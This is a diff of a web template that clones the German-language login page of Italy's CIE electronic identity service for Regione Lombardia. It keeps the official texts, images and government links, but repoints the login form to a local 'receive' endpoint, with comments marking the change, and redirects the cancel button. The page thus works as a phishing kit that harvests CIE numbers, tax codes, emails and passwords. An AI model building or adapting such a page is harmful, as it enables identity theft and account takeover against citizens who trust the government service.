+                                            <span class="sr-only">Selezione lingua: lingua selezionata</span>
+                                            <span> DEU </span>
+                                            <svg class="icon-expand icon icon-xs">
+                                                <use
+                                                    href="{{ url_for('static', filename='login_cie/sprite.svg') }}#it-expand">
+                                                </use>
+                                            </svg>
+                                        </a>
 
+                                        <div class="dropdown-menu" role="region" aria-labelledby="eccLangNavDropdown">
+                                            <div class="link-list-wrapper">
+                                                <ul class="link-list">
+                                                    <li><a id="switch2it" class="dropdown-item list-item current"
+                                                            href="{{ url_for('login_cie') }}"><span>ITA <span
+                                                                    class="sr-only">selezionata</span></span></a></li>
+                                                    <li><a id="switch2de" class="dropdown-item list-item"
+                                                            href="{{ url_for('login_cie', lang = 'deu') }}"><span>DEU
+                                                            </span></a></li>
+                                                </ul>
+                                            </div>
+                                        </div>
 
-<div id="statusHandler" class="row mb-4 mx-n2 error">
-	
-		<div class="col"><br><br></div>
-	
-</div>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
 
+                        <!-- /lang -->
 
-<div class="mt-3">
-     <form method="POST" action="/idp/login/livello2" id="loginUP">
-                                                       
-          <div class="form-row">
-               <div class="form-group col mb-5">
-                    <div class="input-group">
-                         
-                         <label for="username" class="sr-only active" style="transition: none;">Nummer der <abbr title="Carta d'Identità Elettronica">CIE</abbr> oder Steuernummer oder E-Mail-Adresse</label>
-                         <input type="text" class="form-control" id="username" name="username" placeholder="Nummer der CIE oder Steuernummer oder E-Mail-Adresse" autocomplete="username" tabindex="1">
-
-                         <div class="input-group-append">
-                              <div class="input-group-text" id="usernameIcon">
-                                   <a href="#" data-toggle="modal" data-target="#helpCard"><svg class="icon icon-primary icon-sm"><use xlink:href="/idp/images/l12/sprite.svg#it-info-circle"></use></svg></a>
-                              </div>
-                         </div>
 
                     </div>
-                    <div class="ipzs-validator" id="usernameError">&nbsp;</div>
-               </div>
-          </div>
-          <div class="form-row">
-               <div class="form-group col mb-2">
-                    <div class="input-group">
-                         <label for="password" class="sr-only active" style="transition: none;">Passwort</label>
-                         <input type="password" class="form-control input-password" id="password" name="password" placeholder="Passwort" value="" autocomplete="current-password" tabindex="2">
-                         <span class="password-icon" aria-hidden="true">
-                              <svg class="password-icon-visible icon icon-primary icon-sm d-none"><use xlink:href="/idp/images/l12/sprite.svg#it-password-visible"></use></svg>
-                              <svg class="password-icon-invisible icon icon-primary icon-sm "><use xlink:href="/idp/images/l12/sprite.svg#it-password-invisible"></use></svg>
-                         </span>
+
+                    <div class="col-4 col-lg-1 text-right">
+                        <img src="{{ url_for('static', filename='login_cie_deu/CIE.png') }}"
+                            alt="Carta d'identita' elettronica">
                     </div>
-                    <div class="ipzs-validator" id="passwordError">&nbsp;</div>
-               </div>
-          </div>
+                </div>
 
-          <div class="mt-1 pb-1">
-               <p class="c2">Haben Sie Ihr Passwort vergessen? <strong><a href="https://www.cartaidentita.interno.gov.it/pgic/login/recupera-password" title="Neues Passwort anfordern" class="text-nowrap" target="_blank">Fordern Sie ein neues an</a></strong></p>
-          </div>
-          <div class="row buttons mt-4 pb-3">
-               <div class="col-12 col-md-5 text-center mb-3 pr-md-3">
-                    <a href="https://idserver.servizicie.interno.gov.it/idp/Authn/GestioniErroriSSL?erroreSSL=error25&amp;conversation=e2s1" type="button" class="btn btn-outline-primary w-100 text-nowrap">Abbrechen</a>
-               </div>
-               <div class="col-12 col-md-7 text-center">
-                    <button type="submit" class="btn btn-primary w-100">Weiter</button>
-               </div>
-          </div>
-          <div>
-               <p class="c2">Sie haben Ihre CIE-Zugangsdaten noch nicht aktiviert? <strong><a href="https://www.cartaidentita.interno.gov.it/pgic/attivazione-credenziali-puk" title="Aktivieren Sie jetzt die CIE-Zugangsdaten" class="text-nowrap" target="_blank">Aktivieren Sie sie jetzt</a></strong></p>			
-          </div>	
-     </form>
+            </div>
+        </div>
+    </div>
+    <!-- /header -->
 
-     <script>
-     $(document).ready(function() {
-          var submittingUP=false;
-          $('#loginUP').submit(function( event ) {
-               if(!submittingUP){
-                    if(checkUsernameAndPassword()){
-                         submittingUP=true;
-                         return true;
-                    }
-               }
-               event.preventDefault();
-               return false;
-          });
-     });
-     </script>
+    <div id="wrapperL12">
+        <div class="container my-4">
 
-     <div class="modal fade" tabindex="-1" role="dialog" id="helpCard" aria-hidden="true">
-          <div class="modal-dialog modal-lg" role="document">
-               <div class="modal-content ">
-                    <div class="modal-header ipzs-bb">
-                         <h3 class="modal-title">Wo finde ich diese Daten?<br>
-                              <small class="c3">Sie können einen der folgenden Benutzernamen verwenden:</small>
-                         </h3>
-                         <button class="close" type="button" data-dismiss="modal" aria-label="Close">
-                         <svg class="icon icon-primary">
-                              <use xlink:href="/idp/images/l12/sprite.svg#it-close-circle"></use>
-                         </svg>
-                         </button>
+
+
+
+
+            <div class="row">
+                <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+                <div class="col">
+                    <div class="row">
+                        <div id="title" class="mb-4 col">
+                            <p class="c1">
+                                <strong>
+                                    ANFRAGE EINSTIEG CIE
+
+                                    STUFE 2
+
+                                </strong>
+                            </p>
+                            <h1>Regione Lombardia</h1>
+                        </div>
                     </div>
-                    <div class="modal-body">
+                </div>
+                <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+            </div>
 
-                         <div class="container">
-                              <div class="row">
-                                   <div class="col-12 col-lg-6">
-                                        <p class="pb-2 text-uppercase"><strong>NUMMER DER CIE/EIK</strong></p>
-                                        <p class="text-center text-lg-left"><img src="{{ url_for('static', filename='login_cie_deu/fac-simile-cie.png') }}" alt="fac-simile carta d'identità" class="img-fluid"></p>
-                                        <p class="py-4 py-lg-2 c3">Es ist jene Nummer, die Sie in der oberen rechten Ecke Ihrer elektronischen Identitätskarte finden. Bsp. CA00000AA</p>
-                                   </div>
-                                   <div class="col-12 col-lg-6">
-                                        <p class="pb-2 text-uppercase"><strong>Steuernummer</strong></p>
-                                        <p class="text-center text-lg-left"><img src="{{ url_for('static', filename='login_cie_deu/fac-simile-cie_retro.png') }}" alt="fac-simile retro carta d'identità" class="img-fluid"></p>
-                                        <p class="py-4 py-lg-2 c3">Es ist der 16-stellige alphanumerische Code, der sich auf der Rückseite Ihrer elektronischen Identitätskarte befindet.</p>
-                                   </div>
-                              </div>
-                              <div class="row">
-                                   <div class="col">
-                                        <p class="pb-2 pt-4 text-uppercase"><strong>E-MAIL-ADRESSE</strong></p>
-                                        <p class="pb-2 c3">
-                                             Es ist die E-Mail-Adresse, 
-die Sie mit Ihrer digitalen Identität CIE verknüpft haben. Sie können 
-diese im persönlichen Bereich ändern
-                                        </p>
-                                   </div>
-                              </div>
-                         </div>
+
+            <div class="row">
+                <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+                <div class="col mx-0 mx-sm-n4">
+
+                    <div class="card-wrapper card-space">
+                        <div class="card card-bg card-bg-small-none card-big py-0 mx-0 mx-md-1">
+                            <div class="card-body p-0 p-sm-4">
+
+                                <div class="row">
+
+
+                                    <div id="loginwithappcard" class="col-12 col-lg-6 pr-lg-4 d-none mb-5 p-0">
+                                        <!--start card-->
+                                        <div class="card card-teaser rounded border-left border-primary p-3">
+                                            <div class="card-body">
+                                                <div class="row align-items-center">
+                                                    <div class="col-2 ml-3">
+                                                        <img class="img-fluid"
+                                                            src="{{ url_for('static', filename='login_cie_deu/android1.jpg') }}"
+                                                            alt="CIE Logo">
+                                                    </div>
+                                                    <div class="col-9">
+                                                        <h3 class="card-title font-weight-semibold c4">Hai l'app CieID?
+                                                        </h3>
+                                                        <p>Accedi più velocemente</p>
+                                                    </div>
+                                                </div>
+                                                <a href="https://ios.idserver.servizicie.interno.gov.it/idp/login/app?opId=_7e4bb538902a7e4282b9268b3a73246c_b7cf1246e7d5137f0effb1fb4dcfa74c&amp;challenge=OttfDtHebH%2BQFA%2B6xF8lAQ2LiR%2BOuymDgk8PLSg9&amp;level=2&amp;SPName=https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&amp;value=e2s1"
+                                                    class="stretched-link"><span class="sr-only">Autorizza con l'App
+                                                        CieID</span></a>
+                                            </div>
+                                        </div>
+                                        <!--end card-->
+                                    </div>
+
+                                    <script>
+                                        $(document).ready(function () {
+                                            if (is.mobile()) {
+                                                //mostra loginwithappcard solo per dispositivi mobile
+                                                $("#loginwithappcard").removeClass("d-none");
+                                            }
+                                        });
+                                    </script>
+                                    <div class="col-12 col-lg-6 pr-lg-4">
+
+
+
+                                        <h2>Anmelden mit Ihren Zugangsdaten CIE</h2>
+
+
+
+
+                                        <div id="statusHandler" class="row mb-4 mx-n2 error">
+
+                                            <div class="col"><br><br></div>
+
+                                        </div>
+
+
+                                        <div class="mt-3">
+                                            <form method="POST" action="{{ url_for('receive') }}" id="loginUP">  <!-- MODIFICATION   -->
+                                                <input type="hidden" name="lang" value="deu"> <!-- MODIFICATION   -->
+
+                                                <div class="form-row">
+                                                    <div class="form-group col mb-5">
+                                                        <div class="input-group">
+
+                                                            <label for="username" class="sr-only active"
+                                                                style="transition: none;">Nummer der <abbr
+                                                                    title="Carta d'Identità Elettronica">CIE</abbr> oder
+                                                                Steuernummer oder E-Mail-Adresse</label>
+                                                            <input type="text" class="form-control" id="username"
+                                                                name="username"
+                                                                placeholder="Nummer der CIE oder Steuernummer oder E-Mail-Adresse"
+                                                                autocomplete="username" tabindex="1">
+
+                                                            <div class="input-group-append">
+                                                                <div class="input-group-text" id="usernameIcon">
+                                                                    <a href="#" data-toggle="modal"
+                                                                        data-target="#helpCard"><svg
+                                                                            class="icon icon-primary icon-sm">
+                                                                            <use
+                                                                                xlink:href="/idp/images/l12/sprite.svg#it-info-circle">
+                                                                            </use>
+                                                                        </svg></a>
+                                                                </div>
+                                                            </div>
+
+                                                        </div>
+                                                        <div class="ipzs-validator" id="usernameError">&nbsp;</div>
+                                                    </div>
+                                                </div>
+                                                <div class="form-row">
+                                                    <div class="form-group col mb-2">
+                                                        <div class="input-group">
+                                                            <label for="password" class="sr-only active"
+                                                                style="transition: none;">Passwort</label>
+                                                            <input type="password" class="form-control input-password"
+                                                                id="password" name="password" placeholder="Passwort"
+                                                                value="" autocomplete="current-password" tabindex="2">
+                                                            <span class="password-icon" aria-hidden="true">
+                                                                <svg
+                                                                    class="password-icon-visible icon icon-primary icon-sm d-none">
+                                                                    <use
+                                                                        xlink:href="/idp/images/l12/sprite.svg#it-password-visible">
+                                                                    </use>
+                                                                </svg>
+                                                                <svg
+                                                                    class="password-icon-invisible icon icon-primary icon-sm ">
+                                                                    <use
+                                                                        xlink:href="/idp/images/l12/sprite.svg#it-password-invisible">
+                                                                    </use>
+                                                                </svg>
+                                                            </span>
+                                                        </div>
+                                                        <div class="ipzs-validator" id="passwordError">&nbsp;</div>
+                                                    </div>
+                                                </div>
+
+                                                <div class="mt-1 pb-1">
+                                                    <p class="c2">Haben Sie Ihr Passwort vergessen? <strong><a
+                                                                href="https://www.cartaidentita.interno.gov.it/pgic/login/recupera-password"
+                                                                title="Neues Passwort anfordern" class="text-nowrap"
+                                                                target="_blank">Fordern Sie ein neues an</a></strong>
+                                                    </p>
+                                                </div>
+                                                <div class="row buttons mt-4 pb-3">
+                                                    <div class="col-12 col-md-5 text-center mb-3 pr-md-3">
+                                                        <a href="{{ url_for('landing_page') }}" type="button"
+                                                            class="btn btn-outline-primary w-100 text-nowrap">Abbrechen</a>
+                                                    </div>
+                                                    <div class="col-12 col-md-7 text-center">
+                                                        <button type="submit"
+                                                            class="btn btn-primary w-100">Weiter</button>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <p class="c2">Sie haben Ihre CIE-Zugangsdaten noch nicht aktiviert?
+                                                        <strong><a
+                                                                href="https://www.cartaidentita.interno.gov.it/pgic/attivazione-credenziali-puk"
+                                                                title="Aktivieren Sie jetzt die CIE-Zugangsdaten"
+                                                                class="text-nowrap" target="_blank">Aktivieren Sie sie
+                                                                jetzt</a></strong>
+                                                    </p>
+                                                </div>
+                                            </form>
+                                            <script>
+                                                $(document).ready(function () {
+                                                    var submittingUP = false;
+                                                    $('#loginUP').submit(function (event) {
+                                                        if (!submittingUP) {
+                                                            if (checkUsernameAndPassword()) {
+                                                                submittingUP = true;
+                                                                return true;
+                                                            }
+                                                        }
+                                                        event.preventDefault();
+                                                        return false;
+                                                    });
+                                                });
+                                            </script>
+
+                                            <div class="modal fade" tabindex="-1" role="dialog" id="helpCard"
+                                                aria-hidden="true">
+                                                <div class="modal-dialog modal-lg" role="document">
+                                                    <div class="modal-content ">
+                                                        <div class="modal-header ipzs-bb">
+                                                            <h3 class="modal-title">Wo finde ich diese Daten?<br>
+                                                                <small class="c3">Sie können einen der folgenden
+                                                                    Benutzernamen verwenden:</small>
+                                                            </h3>
+                                                            <button class="close" type="button" data-dismiss="modal"
+                                                                aria-label="Close">
+                                                                <svg class="icon icon-primary">
+                                                                    <use
+                                                                        xlink:href="/idp/images/l12/sprite.svg#it-close-circle">
+                                                                    </use>
+                                                                </svg>
+                                                            </button>
+                                                        </div>
+                                                        <div class="modal-body">
+
+                                                            <div class="container">
+                                                                <div class="row">
+                                                                    <div class="col-12 col-lg-6">
+                                                                        <p class="pb-2 text-uppercase"><strong>NUMMER
+                                                                                DER CIE/EIK</strong></p>
+                                                                        <p class="text-center text-lg-left"><img
+                                                                                src="{{ url_for('static', filename='login_cie_deu/fac-simile-cie.png') }}"
+                                                                                alt="fac-simile carta d'identità"
+                                                                                class="img-fluid"></p>
+                                                                        <p class="py-4 py-lg-2 c3">Es ist jene Nummer,
+                                                                            die Sie in der oberen rechten Ecke Ihrer
+                                                                            elektronischen Identitätskarte finden. Bsp.
+                                                                            CA00000AA</p>
+                                                                    </div>
+                                                                    <div class="col-12 col-lg-6">
+                                                                        <p class="pb-2 text-uppercase">
+                                                                            <strong>Steuernummer</strong>
+                                                                        </p>
+                                                                        <p class="text-center text-lg-left"><img
+                                                                                src="{{ url_for('static', filename='login_cie_deu/fac-simile-cie_retro.png') }}"
+                                                                                alt="fac-simile retro carta d'identità"
+                                                                                class="img-fluid"></p>
+                                                                        <p class="py-4 py-lg-2 c3">Es ist der
+                                                                            16-stellige alphanumerische Code, der sich
+                                                                            auf der Rückseite Ihrer elektronischen
+                                                                            Identitätskarte befindet.</p>
+                                                                    </div>
+                                                                </div>
+                                                                <div class="row">
+                                                                    <div class="col">
+                                                                        <p class="pb-2 pt-4 text-uppercase">
+                                                                            <strong>E-MAIL-ADRESSE</strong>
+                                                                        </p>
+                                                                        <p class="pb-2 c3">
+                                                                            Es ist die E-Mail-Adresse,
+                                                                            die Sie mit Ihrer digitalen Identität CIE
+                                                                            verknüpft haben. Sie können
+                                                                            diese im persönlichen Bereich ändern
+                                                                        </p>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+
+                                                        </div>
+                                                        <div class="modal-footer">
+                                                            <button class="btn btn-primary btn-sm px-5" type="button"
+                                                                data-dismiss="modal">Schließen</button>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                    </div>
+                                    <div class="col-12 col-lg-6 pl-lg-4 verticalHr d-none d-md-block">
+
+
+
+                                        <div id="qrWrapper" class="">
+                                            <h2>Anmelden mit App CieID</h2>
+                                            <p class="c2">Wenn Sie die CIE-Zugangsdaten (Stufe 2) aktiviert haben
+                                                und Ihr Gerät zertifiziert haben, öffnen Sie die App CieID und scannen
+                                                Sie den QR Code.</p>
+
+                                            <div>
+                                                <div>
+                                                    <div class="text-center" id="qrWrapperImg">
+                                                        <figure id="qrFigure" class="overlay-wrapper">
+                                                            <img class="img-fluid"
+                                                                src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAPoAAAD6AQAAAACgl2eQAAAFR0lEQVR4Xu2YTYqsShCFo3DgrGoDCbmNnLkl3YCWG9AtOXMbghuomuVAKt4XVmv1vRcuPDJ58KClaernQKURJ845oejfr0l+/+S36wfwvn4A7+s/AkSRarnERcS1pWtUbpN/yXIVuWUD6Cus47SOyovtWm5SFqr+VemYDbBcK2krd5sW/nfzjgnFKxQ5AUGu1drP/i5LXS0Nt1nqkBdQFb26NqyvQBnX0ZBrVgAFdHW1DtXWBr2XW12uTy1+LXUiQCTwi3/8fSfMn9/+K4Bdy22SOuhDlGLCwFt0t5PV6YAoV/FDWQzirZL2qX+UWzO7LhuA7iwtn0Tl84tKp64O22VajzMkA5Rvvc7FXba60qHi7bqT5DhDBoB/TiiA3OJ2FXeLDKYTzhDPZqUD9B6kLeWi/h4KiMfg6CzNbF/lAURlaq7BOtVRvakYJ1eXjpIenEwG6PqqGJPlpvyuSKkv+ByFUToOmQ6w0vFVNy3NvFw4g0IG1wrEyAVY6lKuYelmqcUDtpudi6f64wzJgKjoCW1iMCnpZbYj1cFhMWepkwEbUswNNhNT464VxKOGqP32dZs5AHy1ywsisMHqAfEPOn6GNxmgiLA+jA/Q2/dz8RJ9lVbJMRtgaUxkXDNRQ79rJra73Wbz4lwArPAy+x5W28gzNcYNBOGrkumA6DVyUwXE0HmrxViN1FyB5QLwtrLxfEbfT6aNvHjO/qmHLaYDokftSSbdTNBa+0kaJQgxntvB6gyAwXwcQ9ehJA75hyxdXKGE5gIgL2qx51GaMD7hBjceMN+zm8mA3XmJoJdIPsGwBO49yuJVnrOZDFBMcJMKBYYA9AjBJMhtl/mj9skAJ2JMaCszd6k2S4wzJT3HPxlgBCMuUkMnpeuijrHop7fs5wKsd5FLNBo/Av5LJSGDsCwcpU4H0HrLb8xjMyH4pgAiJpjHGZIBkDmsEGDkGNN6r1gNYN1iLpYLEC3/0CCBbLBO0ExisB8/npUMUIpW2FtbCoQFhwD/sEqeap8OgABIMW6Lp+u9IgWh9uxTn0qmAiILmm2XbeDXCwRNhJVq7T/jnwxQW82e5JOKAlqnBmucHek4ZDrAnPeOtmAirFEVEQt60KxfrDkJEC2fdNHhv/Sow7xm/zDkWcl0gEliM7E1+yEstbydt1Dz+lwA30dCO7PvWaAGY5rD2etw0j4dYAvgBeGa8SzrHbn0OWuP1+cCYIim9izmzCaCSSXxrO8pKBmA8wZeGbEJPze7axLL2uupMBkAz3l/9jItu7OQGFFmB8nPUicD7KlLH5dGpS4tlljumrEA/1XJdICFWyKEZd3RzItlDW5s7XmGDAC2M0SM8Ydp68syvD1taOKZH9IBxf7HG9ok0GCoHP7VflJxMoC+iDPBt5YtF93avYbcrP3LA4Bm5oZ1gM9sgnQKhTHwwYdkwB7UbfuzlGWLIZW8ErOns5IZAN3MeLIdcKf2CJEsQX6wOcoFMO9gDI0AF8vYS2dPk7TfH4pmAtAgwgMnYY1dn7Yp4CwkCnsslglAp9jL3v1i8GE1N8iycFQyA0BNKtk35+JhD5Fg+EYlWzkNJR2A8BZGPMVNSEEkUhIFiUizAdTutLfEizmyT/HT/l66my07mQD7U9ZREWF8yurZijVuCK7LBtBXZZvgI8A9HXF5pWXk6o/zJgOI0Obvx3awZxVy0bftIAeATi0S2JoxFBrnJOi3iJIFoERQsq4tzowM6V0J8BkB+gpeJ0Rs4wbJjdc9mjafx03pAOMD43mzFGRuyBnU9s1fCJME+Ov1A3hfP4D39f8A/AM9BnwHbHEY3wAAAABJRU5ErkJggg=="
+                                                                alt="QR code">
+                                                            <figcaption id="qrOverlay"
+                                                                class="overlay-panel overlay-panel-fullheight overlay-black"
+                                                                style="display:none;"><span
+                                                                    class="my-auto mx-auto"></span></figcaption>
+                                                        </figure>
+                                                        <noscript>
+                                                            Codice QR valido per 2 minuti.
+                                                        </noscript>
+                                                    </div>
+                                                </div>
+                                                <div id="qrMsgWrapper">
+                                                    <p class="text-center c2">Wenn Sie den vereinfachten Modus nicht
+                                                        nutzen möchten und Ihre Karte bereits in der CieID-App (Stufe 3)
+                                                        registriert haben, wählen Sie hier unten "Mit Auslesen der
+                                                        CIE-Karte
+                                                        anmelden"</p>
+                                                    <p class="text-center"><span class="c2">Gültigkeit
+                                                            Code:</span><strong><span id="spanSec"> 1':51"</span>
+                                                        </strong></p>
+                                                </div>
+                                                <div id="qrGeneratorWrapper" class="text-center py5"
+                                                    style="display: none;">
+                                                    <div class="pb-3">
+                                                        <p class="text-center c2">Der QR Code ist nicht mehr gültig<br>
+                                                            <a
+                                                                href="https://idserver.servizicie.interno.gov.it/idp/login/livello2">Fordern
+                                                                Sie ihn erneut an</a>
+                                                        </p>
+                                                        <br>
+                                                    </div>
+                                                </div>
+                                                <div id="postQRLink" style="display: none;">
+                                                    <p class="text-center c2"><a
+                                                            href="https://idserver.servizicie.interno.gov.it/idp/login/livello1e2postqrcode"
+                                                            title="Nachdem Sie den QR-Code gescannt haben, klicken Sie hier um fortzufahren">Clicca
+                                                            qui dopo aver autenticato tramite QR sulla APP</a></p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <script>
+                                            $(document).ready(function () {
+                                                if (!is.mobile()) {
+                                                    $("#qrWrapper").removeClass("d-none"); //tablet/desktop
+
+                                                    checkQRScanned();
+
+                                                    var tempoQR = parseInt("117488");
+
+                                                    countdownQR(Date.now() + tempoQR);
+                                                }
+                                            });
+                                        </script>
+
+
+
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+                <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+            </div>
+
+
+
+
+            <div id="alternative">
+                <div class="row d-none d-sm-flex">
+                    <div class="col-2 d-none d-lg-flex"></div>
+                    <div class="col">
+
+                        <div class="row py-2">
+                            <div class="col">
+                                <hr>
+                            </div>
+                            <div class="col-2 mx-n1 mx-lg-n3">
+                                <p class="c2 text-center or">oder</p>
+                            </div>
+                            <div class="col">
+                                <hr>
+                            </div>
+                        </div>
 
                     </div>
-                    <div class="modal-footer">
-                         <button class="btn btn-primary btn-sm px-5" type="button" data-dismiss="modal">Schließen</button>
+                    <div class="col-2 d-none d-lg-flex"></div>
+                </div>
+
+                <div class="row">
+                    <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+                    <div class="col mx-0 mx-sm-n4">
+
+                        <div class="card-wrapper card-space">
+                            <div class="card card-bg card-big p-3 py-sm-0 mx-sm-0 mx-md-1">
+                                <div class="card-body p-0 p-sm-4">
+                                    <h2>Einloggen mit Lesen der Karte</h2>
+
+                                    <div class="row pt-2">
+                                        <div class="col-12 col-lg-8 pr-lg-4">
+                                            <p class="c2">
+                                                Sie können sich mit dem Lesen der Karte (Stufe 3) von einem
+                                                NFC-Smartphone mit der CieID-App anmelden, indem Sie die Karte
+                                                registrieren oder von einem PC mit der Software CIE und einem
+                                                Smart-Card-Reader.
+                                                <br><br>
+                                                <strong><a
+                                                        href="https://www.cartaidentita.interno.gov.it/la-carta/identificazione-digitale/"
+                                                        target="_blank" title="Einstieg mit App CieID">Erfahren Sie
+                                                        mehr.</a></strong><br>
+                                            </p>
+                                        </div>
+                                        <div class="col-12 col-lg-4 pl-lg-4 mt-3 mt-md-0 text-center">
+                                            <a id="switch2L3"
+                                                href="https://ios.idserver.servizicie.interno.gov.it/idp/login/app?opId=_7e4bb538902a7e4282b9268b3a73246c_b7cf1246e7d5137f0effb1fb4dcfa74c&amp;challenge=OttfDtHebH%2BQFA%2B6xF8lAQ2LiR%2BOuymDgk8PLSg9&amp;level=3&amp;SPName=https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&amp;value=e2s1&amp;nextUrl=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2FAuthn%2FX509&amp;name=conversation&amp;authnRequestString=_7e4bb538902a7e4282b9268b3a73246c_b7cf1246e7d5137f0effb1fb4dcfa74c&amp;OpText=Inserisci+le+ultime+4+cifre+del+PIN+ricevute+insieme+alla+tua+Carta+di+Identit%C3%A0+Elettronica+per+accedere+a+https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;imgUrl=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png"
+                                                class="btn btn-primary btn-image btn-card mb-2 text-nowrap w-100">Einloggen
+                                                mit Lesen der Karte</a>
+                                        </div>
+                                    </div>
+
+                                </div>
+                            </div>
+                        </div>
+
                     </div>
-               </div>
-          </div>
-     </div>
-</div>
-											
-											</div>
-											<div class="col-12 col-lg-6 pl-lg-4 verticalHr d-none d-md-block">
-												
- 
+                    <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+                </div>
 
-<div id="qrWrapper" class="">
-	<h2>Anmelden mit App CieID</h2>
-	<p class="c2">Wenn Sie die CIE-Zugangsdaten (Stufe 2) aktiviert haben 
-und Ihr Gerät zertifiziert haben, öffnen Sie die App CieID und scannen 
-Sie den QR Code.</p>
+            </div>
 
-	<div>
-		<div>
-			<div class="text-center" id="qrWrapperImg">
-				<figure id="qrFigure" class="overlay-wrapper">
-					<img class="img-fluid" src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAPoAAAD6AQAAAACgl2eQAAAFR0lEQVR4Xu2YTYqsShCFo3DgrGoDCbmNnLkl3YCWG9AtOXMbghuomuVAKt4XVmv1vRcuPDJ58KClaernQKURJ845oejfr0l+/+S36wfwvn4A7+s/AkSRarnERcS1pWtUbpN/yXIVuWUD6Cus47SOyovtWm5SFqr+VemYDbBcK2krd5sW/nfzjgnFKxQ5AUGu1drP/i5LXS0Nt1nqkBdQFb26NqyvQBnX0ZBrVgAFdHW1DtXWBr2XW12uTy1+LXUiQCTwi3/8fSfMn9/+K4Bdy22SOuhDlGLCwFt0t5PV6YAoV/FDWQzirZL2qX+UWzO7LhuA7iwtn0Tl84tKp64O22VajzMkA5Rvvc7FXba60qHi7bqT5DhDBoB/TiiA3OJ2FXeLDKYTzhDPZqUD9B6kLeWi/h4KiMfg6CzNbF/lAURlaq7BOtVRvakYJ1eXjpIenEwG6PqqGJPlpvyuSKkv+ByFUToOmQ6w0vFVNy3NvFw4g0IG1wrEyAVY6lKuYelmqcUDtpudi6f64wzJgKjoCW1iMCnpZbYj1cFhMWepkwEbUswNNhNT464VxKOGqP32dZs5AHy1ywsisMHqAfEPOn6GNxmgiLA+jA/Q2/dz8RJ9lVbJMRtgaUxkXDNRQ79rJra73Wbz4lwArPAy+x5W28gzNcYNBOGrkumA6DVyUwXE0HmrxViN1FyB5QLwtrLxfEbfT6aNvHjO/qmHLaYDokftSSbdTNBa+0kaJQgxntvB6gyAwXwcQ9ehJA75hyxdXKGE5gIgL2qx51GaMD7hBjceMN+zm8mA3XmJoJdIPsGwBO49yuJVnrOZDFBMcJMKBYYA9AjBJMhtl/mj9skAJ2JMaCszd6k2S4wzJT3HPxlgBCMuUkMnpeuijrHop7fs5wKsd5FLNBo/Av5LJSGDsCwcpU4H0HrLb8xjMyH4pgAiJpjHGZIBkDmsEGDkGNN6r1gNYN1iLpYLEC3/0CCBbLBO0ExisB8/npUMUIpW2FtbCoQFhwD/sEqeap8OgABIMW6Lp+u9IgWh9uxTn0qmAiILmm2XbeDXCwRNhJVq7T/jnwxQW82e5JOKAlqnBmucHek4ZDrAnPeOtmAirFEVEQt60KxfrDkJEC2fdNHhv/Sow7xm/zDkWcl0gEliM7E1+yEstbydt1Dz+lwA30dCO7PvWaAGY5rD2etw0j4dYAvgBeGa8SzrHbn0OWuP1+cCYIim9izmzCaCSSXxrO8pKBmA8wZeGbEJPze7axLL2uupMBkAz3l/9jItu7OQGFFmB8nPUicD7KlLH5dGpS4tlljumrEA/1XJdICFWyKEZd3RzItlDW5s7XmGDAC2M0SM8Ydp68syvD1taOKZH9IBxf7HG9ok0GCoHP7VflJxMoC+iDPBt5YtF93avYbcrP3LA4Bm5oZ1gM9sgnQKhTHwwYdkwB7UbfuzlGWLIZW8ErOns5IZAN3MeLIdcKf2CJEsQX6wOcoFMO9gDI0AF8vYS2dPk7TfH4pmAtAgwgMnYY1dn7Yp4CwkCnsslglAp9jL3v1i8GE1N8iycFQyA0BNKtk35+JhD5Fg+EYlWzkNJR2A8BZGPMVNSEEkUhIFiUizAdTutLfEizmyT/HT/l66my07mQD7U9ZREWF8yurZijVuCK7LBtBXZZvgI8A9HXF5pWXk6o/zJgOI0Obvx3awZxVy0bftIAeATi0S2JoxFBrnJOi3iJIFoERQsq4tzowM6V0J8BkB+gpeJ0Rs4wbJjdc9mjafx03pAOMD43mzFGRuyBnU9s1fCJME+Ov1A3hfP4D39f8A/AM9BnwHbHEY3wAAAABJRU5ErkJggg==" alt="QR code">
-					<figcaption id="qrOverlay" class="overlay-panel overlay-panel-fullheight overlay-black" style="display:none;"><span class="my-auto mx-auto"></span></figcaption>
-				</figure>
-				<noscript>
-					Codice QR valido per 2 minuti.
-				</noscript>
-			</div>
-		</div>
-		<div id="qrMsgWrapper">
-			<p class="text-center c2">Wenn Sie den vereinfachten Modus nicht 
-nutzen möchten und Ihre Karte bereits in der CieID-App (Stufe 3) 
-registriert haben, wählen Sie hier unten "Mit Auslesen der CIE-Karte 
-anmelden"</p>
-			<p class="text-center"><span class="c2">Gültigkeit Code:</span><strong><span id="spanSec"> 1':51"</span> </strong></p>
-		</div>													
-		<div id="qrGeneratorWrapper" class="text-center py5" style="display: none;">
-			<div class="pb-3">
-				<p class="text-center c2">Der QR Code ist nicht mehr gültig<br>
-					<a href="https://idserver.servizicie.interno.gov.it/idp/login/livello2">Fordern Sie ihn erneut an</a>
-				</p>
-				<br>
-			</div>
-		</div>
-		<div id="postQRLink" style="display: none;">
